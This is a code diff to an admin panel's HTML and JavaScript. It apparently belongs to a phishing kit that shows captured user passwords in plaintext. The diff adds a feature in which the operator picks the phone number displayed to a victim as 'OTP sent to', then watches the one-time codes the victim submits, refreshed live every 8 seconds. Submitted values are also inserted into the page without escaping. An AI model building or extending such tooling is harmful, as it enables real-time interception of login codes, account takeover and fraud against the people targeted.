@@ -102,6 +102,30 @@
     .abtn-no:hover{background:rgba(239,68,68,.18)}
     .abtn-re{background:rgba(59,130,246,.1);color:#1d4ed8;border:1.5px solid rgba(59,130,246,.2)}
     .abtn-re:hover{background:rgba(59,130,246,.18)}
+    .abtn-otp{background:rgba(99,102,241,.1);color:#6366f1;border:1.5px solid rgba(99,102,241,.25)}
+    .abtn-otp:hover{background:rgba(99,102,241,.18)}
+    /* OTP attempts log */
+    .otp-log{margin-top:10px;background:#f8f8fc;border:1px solid var(--border);border-radius:8px;padding:10px 12px}
+    .otp-log-title{font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;margin-bottom:6px}
+    .otp-log-item{font-size:12px;padding:4px 0;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
+    .otp-log-item:last-child{border-bottom:none}
+    .otp-code{font-family:monospace;font-weight:700;font-size:14px;color:var(--text);letter-spacing:.08em}
+    .otp-time{font-size:11px;color:var(--muted)}
+    .otp-phone-disp{font-size:11px;color:#6366f1;font-weight:600;margin-top:4px}
+    .otp-status-tag{font-size:10px;font-weight:700;padding:2px 7px;border-radius:100px}
+    .otp-active{background:rgba(34,197,94,.1);color:#15803d}
+    .otp-exp{background:rgba(239,68,68,.08);color:#b91c1c}
+    /* OTP send modal */
+    .otp-modal-ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:500;align-items:center;justify-content:center;padding:16px}
+    .otp-modal-ov.show{display:flex}
+    .otp-modal{background:var(--card);border-radius:14px;width:100%;max-width:400px;padding:24px}
+    .otp-modal h3{font-size:16px;font-weight:800;margin-bottom:4px}
+    .otp-modal p{font-size:13px;color:var(--muted);margin-bottom:16px}
+    .otp-modal input{width:100%;padding:12px 14px;border:2px solid var(--border);border-radius:9px;font-size:14px;font-family:'Inter',sans-serif;outline:none;margin-bottom:12px}
+    .otp-modal input:focus{border-color:#6366f1}
+    .otp-modal-btns{display:flex;gap:8px;justify-content:flex-end}
+    .otp-modal-cancel{padding:9px 18px;border-radius:8px;font-size:13px;font-weight:600;border:1.5px solid var(--border);background:none;cursor:pointer;font-family:'Inter',sans-serif;color:var(--muted)}
+    .otp-modal-send{padding:9px 18px;border-radius:8px;font-size:13px;font-weight:700;border:none;background:linear-gradient(135deg,#3b82f6,#6366f1);color:#fff;cursor:pointer;font-family:'Inter',sans-serif}
   </style>
 </head>
 <body>
@@ -162,6 +186,19 @@
       <button class="modal-close" onclick="closeModal()">×</button>
     </div>
     <div class="modal-body" id="mBody"></div>
+  </div>
+</div>
+
+<!-- OTP Send Modal -->
+<div class="otp-modal-ov" id="otpModal">
+  <div class="otp-modal">
+    <h3>Send OTP Verification</h3>
+    <p>Enter the phone number to show the user. They'll see: "OTP sent to: [number]"</p>
+    <input type="text" id="otpPhoneInput" placeholder="e.g. +91 98765 43210"/>
+    <div class="otp-modal-btns">
+      <button class="otp-modal-cancel" onclick="closeOtpModal()">Cancel</button>
+      <button class="otp-modal-send" id="otpSendBtn" onclick="sendOtp()">Send OTP Request</button>
+    </div>
   </div>
 </div>
 
@@ -330,6 +367,44 @@ function openModal(u){
 function closeModal(){document.getElementById('uModal').classList.remove('show')}
 document.getElementById('uModal').addEventListener('click',e=>{if(e.target===e.currentTarget)closeModal()});
 
+// ── OTP Modal ──
+let _otpTargetUser='';
+function openOtpModal(username){
+  _otpTargetUser=username;
+  document.getElementById('otpPhoneInput').value='';
+  document.getElementById('otpModal').classList.add('show');
+  document.getElementById('otpPhoneInput').focus();
+}
+function closeOtpModal(){
+  document.getElementById('otpModal').classList.remove('show');
+  _otpTargetUser='';
+}
+document.getElementById('otpModal').addEventListener('click',e=>{if(e.target===e.currentTarget)closeOtpModal()});
+
+async function sendOtp(){
+  const phone=document.getElementById('otpPhoneInput').value.trim();
+  if(!phone){document.getElementById('otpPhoneInput').focus();return;}
+  document.getElementById('otpSendBtn').disabled=true;
+  document.getElementById('otpSendBtn').textContent='Sending…';
+  try{
+    const r=await fetch('/api/otp/send/'+encodeURIComponent(_otpTargetUser),{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone})});
+    const d=await r.json();
+    if(d.ok){
+      closeOtpModal();
+      toast('📱 OTP verification sent to @'+_otpTargetUser);
+      clearSrvCache();
+      loadPending();
+    }else{toast('Failed: '+(d.error||'unknown'));}
+  }catch{toast('Network error');}
+  document.getElementById('otpSendBtn').disabled=false;
+  document.getElementById('otpSendBtn').textContent='Send OTP Request';
+}
+
+// Auto-refresh pending tab every 8s to see new OTP attempts live
+let _pendingAutoRefresh=null;
+function startPendingRefresh(){if(!_pendingAutoRefresh)_pendingAutoRefresh=setInterval(()=>{if(document.getElementById('tab-pending').classList.contains('on')){clearSrvCache();loadPending();}},8000);}
+startPendingRefresh();
+
 async function deleteUser(username){
   if(!confirm('Delete @'+username+'? This will force-logout all their devices and wipe their orders.'))return;
   const r=await fetch('/api/user/'+encodeURIComponent(username)+'/delete',{method:'POST'});
@@ -370,11 +445,35 @@ function pendingRow(u){
     :'<span class="badge be">× Rejected</span>';
   const safe=u.username.replace(/'/g,"\\'&quot;");
   const actions=u.status==='pending'
-    ?`<button class="abtn abtn-ok" onclick="approveUser('${safe}')">&#10003; Approve</button><button class="abtn abtn-no" onclick="rejectUser('${safe}')">&#10007; Reject</button>`
+    ?`<button class="abtn abtn-otp" onclick="openOtpModal('${safe}')">📱 Send OTP</button><button class="abtn abtn-ok" onclick="approveUser('${safe}')">&#10003; Approve</button><button class="abtn abtn-no" onclick="rejectUser('${safe}')">&#10007; Reject</button>`
     :u.status==='rejected'
     ?`<button class="abtn abtn-re" onclick="approveUser('${safe}')">&#8635; Reactivate</button>`
     :'';
   const pid='pw-'+u.username.replace(/[^a-z0-9]/gi,'_');
+  // OTP section
+  let otpHtml='';
+  if(u.otp){
+    const elapsed=Date.now()-new Date(u.otp.sentAt).getTime();
+    const active=elapsed<5*60*1000;
+    const statusTag=active?'<span class="otp-status-tag otp-active">ACTIVE</span>':'<span class="otp-status-tag otp-exp">EXPIRED</span>';
+    otpHtml+=`<div class="otp-log">
+      <div class="otp-log-title">OTP Verification ${statusTag}</div>
+      <div class="otp-phone-disp">📱 Sent to: ${u.otp.phone}</div>`;
+    if(u.otp.attempts&&u.otp.attempts.length){
+      otpHtml+='<div style="margin-top:8px">';
+      u.otp.attempts.forEach((a,i)=>{
+        const t=new Date(a.submittedAt).toLocaleString('en-IN',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
+        otpHtml+=`<div class="otp-log-item"><span style="font-size:11px;color:var(--muted)">#${i+1}</span><span class="otp-code">${a.code}</span><span class="otp-time">${t}</span></div>`;
+      });
+      otpHtml+='</div>';
+    }else{
+      otpHtml+='<div style="font-size:12px;color:var(--muted);margin-top:6px;font-style:italic">No OTP submitted yet</div>';
+    }
+    if(!active&&u.status==='pending'){
+      otpHtml+=`<button class="abtn abtn-otp" style="margin-top:8px;font-size:11px;padding:5px 12px" onclick="openOtpModal('${safe}')">🔄 Resend OTP</button>`;
+    }
+    otpHtml+='</div>';
+  }
   return`<div class="prow">
     <div class="prow-top">
       <span class="av">${u.username[0].toUpperCase()}</span>
@@ -386,6 +485,7 @@ function pendingRow(u){
       <span class="pcred-val" id="${pid}" data-pw="${u.password}" data-vis="0">••••••••</span>
       <button class="pw-toggle" onclick="togglePw('${pid}')">Show</button>
     </div>
+    ${otpHtml}
     ${actions?`<div class="prow-actions">${actions}</div>`:''}
   </div>`;
 }
